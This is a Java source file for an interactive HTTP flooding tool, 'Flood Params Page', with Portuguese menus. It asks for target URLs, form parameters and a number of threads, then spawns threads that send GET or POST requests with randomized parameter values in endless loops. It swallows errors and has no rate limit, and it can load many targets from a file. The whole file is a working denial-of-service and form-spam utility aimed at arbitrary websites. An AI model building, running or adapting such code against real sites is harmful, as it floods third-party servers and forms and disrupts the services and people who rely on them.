import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Random;
import java.util.Scanner;


public class FloodParamsPage {

	private final String USER_AGENT = "Mozilla/5.0";
	private static int total = 0;
	private String site1 = "http://teste.com/"; // site para teste
	private String param1 = "nome=#&telefone=98#"; 

	Scanner scan = new Scanner(System.in);

	public static void main(String[] args) throws Exception {

		final FloodParamsPage http = new FloodParamsPage();		
		
		boolean post = false;
		//Scanner scan = new Scanner(System.in);
		System.out.println("------- Flood Params Page v1.0 -------");
		System.out.print("METHOD POST(1) OU GET(0): ");
		post = (http.scan.nextInt() == 1)? true:false;
		
		http.switchChoice(post);
		
		http.scan.close();
	}
	
	@Override
	protected void finalize() throws Throwable {
		// TODO Auto-generated method stub
		this.scan.close();
		super.finalize();		
	}
	
	public String getUserAgent(){
		return USER_AGENT;
	}
	
	public String getSiteTest(){
		return site1;
	}
	
	public String getParamTest(){
		return param1;
	}
	
	public void setSitesTest(String site1){
		this.site1 = site1;
	}
	
	public void setParamsTest(String param1){
		this.param1 = param1;
	}
	
	private void switchChoice(boolean methodType){//post=true get=post=false
		int choice = this.menuPrincipal();
		switch(choice){//Precisa de blocos vazios igual no C(ANSI)
		case 1:
		{
			int retorno = this.menuMultiplasThreads(methodType);
			if(retorno == 0)					
				switchChoice(methodType);
		}
				
		break;
		case 2:
		{
			int retorno = this.menuSingleThread(methodType);
			if(retorno == 0)					
				switchChoice(methodType);
		}
		break;
		case 3:
			int retorno = this.menuMultiplasThreadsSites(methodType);
			if(retorno == 0)					
				switchChoice(methodType);
		break;
		case 0:
				System.exit(0);
		break;			
		}
	}
	
	private int menuPrincipal(){
		//Scanner scan = new Scanner(System.in);
		int choice = 0;
		boolean uma_vez_do = false;
    	do{			
			
			if(uma_vez_do == false){
				System.out.println("Modos de operação:");
				System.out.println("    1° Multiplas Threads");			
				System.out.println("    2° Single Threads");
				System.out.println("    3° Multiplas Threads, parametros e sites");
				System.out.println("    0 Exit");
				uma_vez_do = true;
			}
			if(choice == 0){
				System.out.print("    Escolha: ");
			}else if(!(choice >= 0 && choice <= 3))
				System.out.print("Escolha [0,3]: ");
			
			choice = scan.nextInt();
		}while(!(choice >= 0 && choice <= 3));

    	return choice;
	}	
	
	private int menuMultiplasThreads(boolean methodType){
		//Scanner scan = new Scanner(System.in);
		int choice = 0;
		boolean uma_vez_do = false;
		do{			
			
			if(uma_vez_do == false){
				System.out.println("        1° parametro com valor random");
				System.out.println("        2° escolher valor para o parametro");
				System.out.println("        3° variavel predefinida");
				System.out.println("        0 voltar");
				uma_vez_do = true;
			}
			if(choice == 0){
				System.out.print("        Escolha: ");
			}else if(!(choice >= 0 && choice <= 3))
				System.out.print("        Escolha [0,3]: ");
				
			choice = scan.nextInt();
		}while(!(choice >= 0 && choice <= 3));
		System.out.println();
		switch(choice){//Precisa de blocos vazios igual no C(ANSI)
		case 1:
		{
			scan.nextLine();
			System.out.print("Digite o site (ex:https://google.com/pagina.php): ");
			String site = scan.nextLine();
			System.out.print("Digite o Parametros (ex:nome=#&telefone=#): ");
			String param = scan.nextLine();
			System.out.print("Numero de Threads: ");
			int nThreads = scan.nextInt();
			return MultiplasThreads(methodType,site, param, nThreads);
		}
		case 2:
		{
			scan.nextLine();
			System.out.print("Digite o site (ex:https://google.com/pagina.php): ");
			String site = scan.nextLine();
			System.out.print("Digite o Parametros (ex:nome=Valor&telefone=Valor): ");
			String param = scan.nextLine();
			System.out.print("Numero de Threads: ");
			int nThreads = scan.nextInt();
			
			return MultiplasThreads(methodType,site, param, nThreads);
		}
		case 3:
		{
			System.out.print("Numero de Threads: ");
			int nThreads = scan.nextInt();			
			return MultiplasThreads(methodType,site1, param1, nThreads);
		}
		case 0:
			return 0;
		}
		return choice;
	}
	
	private int menuSingleThread(boolean methodType){
		//Scanner scan = new Scanner(System.in);
		int choice = 0;
		boolean uma_vez_do = false;
		do{			
			
			if(uma_vez_do == false){
				System.out.println("        1° parametro com valor random");
				System.out.println("        2° escolher valor para o parametro");
				System.out.println("        3° variavel predefinida");
				System.out.println("        0 voltar");
				uma_vez_do = true;
			}
			if(choice == 0){
				System.out.print("        Escolha: ");
			}else if(!(choice >= 0 && choice <= 3))
				System.out.print("        Escolha [0,3]: ");
				
			choice = scan.nextInt();
		}while(!(choice >= 0 && choice <= 3));
		System.out.println();
		switch(choice){//Precisa de blocos vazios igual no C(ANSI)
		case 1:
		{
			scan.nextLine();
			System.out.print("Digite o site (ex:https://google.com/pagina.php): ");
			String site = scan.nextLine();
			System.out.print("Digite o Parametros (ex:nome=#&telefone=#): ");
			String param = scan.nextLine();
			return MultiplasThreads(methodType,site, param, 1);
		}
		case 2:
		{
			scan.nextLine();
			System.out.print("Digite o site (ex:https://google.com/pagina.php): ");
			String site = scan.nextLine();
			System.out.print("Digite o Parametros (ex:nome=Valor&telefone=Valor): ");
			String param = scan.nextLine();
			return MultiplasThreads(methodType,site, param, 1);
		}
		case 3:
		
			return MultiplasThreads(methodType,site1, param1, 1);
		
		case 0:
			return 0;
		}
		return choice;
	}
	
	private int menuMultiplasThreadsSites(boolean methodType){//GAME SAVED case 4:
		int choice = 0;
		boolean uma_vez_do = false;
		do{			
			
			if(uma_vez_do == false){
				System.out.println("        1° parametro com valor random");
				System.out.println("        2° escolher valor para o parametro");
				System.out.println("        3° variavel predefinida");
				System.out.println("        4° sites e parametros de arquivo padrão(site param\\n)");
				System.out.println("        0 voltar");
				uma_vez_do = true;
			}
			if(choice == 0){
				System.out.print("        Escolha: ");
			}else if(!(choice >= 0 && choice <= 4))
				System.out.print("        Escolha [0,4]: ");
				
			choice = scan.nextInt();
		}while(!(choice >= 0 && choice <= 4));
		System.out.println();		
		
		String sites[] = new String[100];
		String params[] = new String[100];
		String site = "";
		String param = "";
		int lengthSites = 0;
		int lengthParams = 0;
		
		switch(choice){//Precisa de blocos vazios igual no C(ANSI)
		case 1:
		{
			
			scan.nextLine();
			System.out.println("Digite \"0\" no final de cada array");//indicar saida igual no C(ANSI)
			System.out.println("Digite os sites (ex:https://google.com/pagina.php): ");
			int i = 0;
			while( !(site = scan.nextLine()).equals("0") ){
				sites[i] = site;
				lengthSites++;
				i++;
			}
			
			System.out.println("Digite o Parametros (ex:nome=#&telefone=#): ");
			
			int a = 0;
			while( !(param = scan.nextLine()).equals("0")){
				params[a] = param;
				lengthParams++;
				a++;
			}
			
			System.out.print("Numero de Threads: ");
			int nThreads = scan.nextInt();
			
			return MultiplasThreadsSites(methodType, Arrays.copyOf(sites, lengthSites), Arrays.copyOf(params, lengthParams), nThreads);
		}
		case 2:
		{
			scan.nextLine();
			System.out.println("Digite \"0\" no final de cada array");//Indicar saida se for zero termina e passa
			System.out.println("Digite os sites (ex:https://google.com/): ");
			int i = 0;
			while( !(site = scan.nextLine()).equals("0") ){
				sites[i] = site;
				lengthSites++;
				i++;
			}
			
			if(choice == 1)
				System.out.print("Digite o Parametros (ex:pagina.php?nome=#&telefone=#): ");
			else
				System.out.print("Digite o Parametros (ex:nome=Valor&telefone=Valor): ");
			int a = 0;
			while( !(param = scan.nextLine()).equals("0")){
				params[a] = param;
				lengthParams++;
				a++;
			}
			
			System.out.println("Numero de Threads: ");
			int nThreads = scan.nextInt();
			return MultiplasThreadsSites(methodType, Arrays.copyOf(sites, lengthSites), Arrays.copyOf(params, lengthParams), nThreads);
		}		
		case 3:
		{
			System.out.println("Numero de Threads: ");
			int nThreads = scan.nextInt();
			return MultiplasThreadsSites(methodType, sites, params, nThreads);
		} 
		case 4:
		{
			ArrayList<String> sitesList = new ArrayList<String>(), paramsList = new ArrayList<>();
			scan.nextLine();
			System.out.print("Digite o diretorio e nome do arquivo (ex:/home/ghost/arq.txt)");
			String arqv = scan.nextLine();
			File file = new File(arqv);
			InputStream input = null;
			BufferedReader buffer = null;
			try{
				input = new FileInputStream(file);
				buffer = new BufferedReader(new InputStreamReader(input));
				int i = 0;
				while(buffer.ready() && i < 100){
					String str = buffer.readLine();
					int indice = str.indexOf(" ");
					sitesList.add(str.substring(0, indice));
					paramsList.add(str.substring(indice+1,str.length()));							
					i++;
				}
				
				System.out.println("\n");
			}catch(FileNotFoundException e){
				System.out.println("Arquivo não encontrado\n\n");
				System.out.println("reiniciando...\n\n");
				System.out.println("------- Flood paramsList Page v1.0 -------");				
			}catch(IOException e){
				e.printStackTrace();
			}finally{
				
			}
			//System.out.println(sitesList[0]);
			
			System.out.println("Numero de Threads: ");
			int nThreads = scan.nextInt();
			return MultiplasThreadsSites(methodType, sitesList.toArray(new String[sitesList.size()]), paramsList.toArray(new String[paramsList.size()]), nThreads);
		}
		case 0:
			return 0;
		}
		
		return choice;
	}
	
	private int MultiplasThreads(boolean methodType,final String site, final String param, int numeroDeThread){
		
		/*if(verificaParametros(site, param) == 0)
			return 0;*/
		
		
		Random rand = new Random();
		int c = 0;
		while(c < numeroDeThread){
			//final int cc = c;
			new Thread(){
				@Override
				public void run(){
					boolean noRandom = false;
					String params[] = null;
					if(param.contains("#"))
						params = param.split("#");
					else
						noRandom = true;
					
					String parametro = "";
					while(true){
						
						try{							
							int i = 0;
							while(true){
								if(noRandom == false)
									for(int q = 0; q<params.length;q++)
										parametro += params[q]+Math.abs(rand.nextInt())+i+total;
								else
									parametro = param;
																
								if(methodType){
									System.out.println("\nTesting 2 - Send Http POST request total:"+total);
									FloodParamsPage.this.sendPost(site,parametro);
								}else{
									System.out.println("\nTesting 2 - Send Http GET request total:"+total);
									String siteN = site;
									int barra = site.lastIndexOf("/");
									if(barra < 0)
										siteN += "/";
									siteN += "?"+parametro;
									System.out.println(siteN);
									FloodParamsPage.this.sendGet(siteN);
								}
								
								System.out.println("total:"+total+"\n");
								total++;		
								parametro = "";
							}
						}catch(Exception e){
							//e.printStackTrace();
						}finally{
							parametro = "";
						}
					}
				}
			}.start();
		c++;
		}
		return -1;
	}
	
	private int verificaParametros(String sites[], String params[]){	
		if(sites == null || params == null){
			System.out.println("Dados insuficientes\n\n");
			System.out.println("reiniciando...\n\n");
			System.out.println("------- Flood Params Page v1.0 -------");
			return 0;
		}else if(sites.length != params.length){
			System.out.println("Dados insuficientes\n\n");
			System.out.println("reiniciando...\n\n");
			System.out.println("------- Flood Params Page v1.0 -------");
			return 0;
		}
		int z = 0;
		while(z < sites.length){
			if(sites[z].isEmpty() || sites[z].isEmpty() || params[z].isEmpty() || params[z].isEmpty()){
				System.out.println("Dados insuficientes\n\n");
				System.out.println("reiniciando...\n\n");
				System.out.println("------- Flood Params Page v1.0 -------");
				return 0;
			}
			z++;
		}
		return 1;
	}
	
	private int MultiplasThreadsSites(boolean methodType,final String sites[], final String params[], int nThreads){
		System.out.println("entrou");
		if(verificaParametros(sites, params) == 0){
			System.out.println("entrou");
			return 0;
		}
			
		System.out.println("entrou");
		boolean noRandom = true;
		String paramsSplit[][] = new String[params.length][];
		for(int i = 0; i < params.length; i++){
			if(params[i].contains("#")){
				paramsSplit[i] = params[i].split("#");
				noRandom = false;
			}
		}
		final boolean noRandBackup = noRandom;
		
		int a = 0;
		while(a < nThreads){
			int c = 0;
			while(c < sites.length){
				final int cc = c;
				new Thread(){
					@Override
					public void run(){
						String parametro = "";
						while(true){						
							try{
								//String params[] = {"",""};
								Random rand = new Random();
								int i = 0;
								while(true){
									if(noRandBackup == false)
										for(int q = 0; q<paramsSplit[cc].length;q++)
											parametro += paramsSplit[cc][q]+Math.abs(rand.nextInt())+i+total;
									else
										parametro = params[cc]; 
									
									if(methodType){
										System.out.println("\nTesting 2 - Send Http POST request total:"+total);
										FloodParamsPage.this.sendPost(sites[cc],parametro);
									}else{
										System.out.println("\nTesting 2 - Send Http GET request total:"+total);
										String siteN = sites[cc];
										int barra = sites[cc].lastIndexOf("/");
										if(barra < 0)
											siteN += "/";
										siteN += parametro;
										System.out.println(siteN);
										FloodParamsPage.this.sendGet(siteN);
									}
									
									System.out.println("total:"+total+"\n");
									total++;		
									parametro = "";
								}
							}catch(Exception e){
								//e.printStackTrace();
							}finally{
								parametro = "";
							}
						}
					}
				}.start();
			c++;
			}
			a++;
		}
		return -1;
	}

	// HTTP GET request
	private void sendGet(String url) throws Exception {
		
		URL obj = new URL(url);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();

		// optional default is GET
		con.setRequestMethod("GET");

		//add request header
		con.setRequestProperty("User-Agent", USER_AGENT);

		int responseCode = con.getResponseCode();
		System.out.println("\nSending 'GET' request to URL : " + url);
		System.out.println("Response Code : " + responseCode);

		BufferedReader in = new BufferedReader(
		        new InputStreamReader(con.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();

		while ((inputLine = in.readLine()) != null) {
			response.append(inputLine);
		}
		in.close();

		//print result
		System.out.println(response.toString());

	}
	
	// HTTP POST request
	private void sendPost(String url,String urlParameters) throws Exception {

		URL obj = new URL(url);
		
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();

		//add reuqest header
		con.setRequestMethod("POST");
		con.setRequestProperty("User-Agent", USER_AGENT);
		con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");

		// Send post request
		con.setDoOutput(true);
		DataOutputStream wr = new DataOutputStream(con.getOutputStream());
		wr.writeBytes(urlParameters);
		wr.flush();
		wr.close();

		int responseCode = con.getResponseCode();
		System.out.println("\nSending 'POST' request to URL : " + url);
		System.out.println("Post parameters : " + urlParameters);
		System.out.println("Response Code : " + responseCode);

		BufferedReader in = new BufferedReader(
		        new InputStreamReader(con.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();

		while ((inputLine = in.readLine()) != null) {
			response.append(inputLine);
		}
		in.close();
		
		//print result
		System.out.println(response.toString());

	}

}
